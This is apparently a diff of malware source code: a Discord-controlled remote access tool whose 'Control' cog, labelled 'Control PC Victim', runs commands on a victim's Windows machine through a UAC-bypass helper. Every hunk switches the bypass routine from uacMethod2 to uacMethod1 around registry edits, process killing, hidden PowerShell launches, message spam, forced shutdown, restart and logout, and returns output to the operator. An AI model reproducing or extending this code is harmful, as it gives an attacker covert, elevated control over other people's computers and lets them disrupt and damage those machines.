@@ -71,7 +71,7 @@ class Control(commands.Cog, description='Control PC Victim'):
 		if not CheckHWID(HWID):
 			return
 		command = f"reg {method} {path} /f"
-		uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+		uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
 		output = str(subprocess.check_output(command, shell=True), 'utf-8')
 		await SendOutput(ctx, output)
 
@@ -81,7 +81,7 @@ class Control(commands.Cog, description='Control PC Victim'):
 		if not CheckHWID(HWID):
 			return
 		command = f'taskkill /f /im {Name}'
-		uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+		uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
 		output = str(subprocess.check_output(command, shell=True), 'utf-8')
 		await SendOutput(ctx, output)
 
@@ -155,12 +155,12 @@ class Control(commands.Cog, description='Control PC Victim'):
 		def subp(method):
 			if method == 'cmd':
 				command = f'cmd /c {path_file}'
-				uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+				uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
 				output = str(subprocess.check_output(command, shell=True), 'utf-8')
 				# await SendOutput(ctx, output)
 			elif method == 'powershell':
 				command = f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {path_file} -Wait"'
-				uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+				uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
 				output = str(subprocess.check_output(command, shell=True), 'utf-8')
 				# await SendOutput(ctx, output)
 		threading.Thread(target = subp, args=(method,)).start()
@@ -174,7 +174,7 @@ class Control(commands.Cog, description='Control PC Victim'):
 			for i in range(amount):
 				if method == 'msg':
 					command = f'cmd /c msg * {message}'
-					uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+					uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
 					output = str(subprocess.check_output(command, shell=True), 'utf-8')	
 				elif method == 'msgbox':
 					win32api.MessageBox(win32con.NULL, message, caption)	
@@ -186,7 +186,7 @@ class Control(commands.Cog, description='Control PC Victim'):
 		if not CheckHWID(HWID):
 			return
 		command = 'shutdown /f /t 0'
-		uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+		uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
 		output = str(subprocess.check_output(command, shell=True), 'utf-8')
 
 	@commands.command(aliases=["restart", "rstart"], brief='Restart PC Victim', description='Restart PC Victim')
@@ -194,7 +194,7 @@ class Control(commands.Cog, description='Control PC Victim'):
 		if not CheckHWID(HWID):
 			return
 		command = 'shutdown /f /r /t 0'
-		uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+		uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
 		output = str(subprocess.check_output(command, shell=True), 'utf-8')
 
 	@commands.command(aliases=["signout", "sout"], brief='Sign Out PC Victim', description='Logout PC Victim')
@@ -202,7 +202,7 @@ class Control(commands.Cog, description='Control PC Victim'):
 		if not CheckHWID(HWID):
 			return
 		command = 'shutdown /l'
-		uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+		uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
 		output = str(subprocess.check_output(command, shell=True), 'utf-8')
 
 	@commands.command(aliases=["blockinput", "binput"], brief='Block Keyboard and Mouse', description='Block Keyboard and Mouse')
@@ -280,7 +280,7 @@ class Control(commands.Cog, description='Control PC Victim'):
 		if process == None:
 			return
 		command = f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {process} -ArgumentList \"{agruments}\" "'
-		uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+		uacMethod1(['C:\\Windows\\System32\\cmd.exe', command])
 		output = str(subprocess.check_output(command,shell = True), 'utf-8')
 		await SendOutput(ctx, output)
 
